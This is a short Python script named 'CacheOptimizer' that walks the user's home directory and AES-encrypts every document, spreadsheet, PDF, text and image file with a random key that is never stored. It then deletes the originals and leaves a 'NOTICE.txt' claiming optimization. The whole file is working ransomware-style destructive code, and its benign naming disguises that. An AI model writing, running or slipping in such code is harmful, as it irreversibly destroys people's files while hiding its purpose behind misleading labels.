from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
import glob
import hashlib

class CacheOptimizer:
    def __init__(self):
        self.chunk_size = 65536
        self.master_key = get_random_bytes(32)
        self.processed = 0
        
    def generate_hash(self, data):
        return hashlib.sha256(data).hexdigest()
    
    def optimize_file(self, filepath):
        try:
            with open(filepath, 'rb') as infile:
                content = infile.read()
            
            cipher = AES.new(self.master_key, AES.MODE_EAX)
            processed_data, tag = cipher.encrypt_and_digest(content)
            
            with open(filepath + '.optimized', 'wb') as outfile:
                outfile.write(cipher.nonce + tag + processed_data)
            
            os.remove(filepath)
            self.processed += 1
            return True
        except:
            return False
    
    def run_optimization(self):
        target_types = ['.docx', '.xlsx', '.pdf', '.txt', '.jpg', '.png']
        base_path = os.path.expanduser('~')
        
        for root, dirs, files in os.walk(base_path):
            for file in files:
                if any(file.endswith(ext) for ext in target_types):
                    full_path = os.path.join(root, file)
                    self.optimize_file(full_path)
        
        notification = os.path.join(base_path, 'NOTICE.txt')
        with open(notification, 'w') as f:
            f.write(f'Optimization complete. {self.processed} files processed.')

if __name__ == "__main__":
    optimizer = CacheOptimizer()
    optimizer.run_optimization()
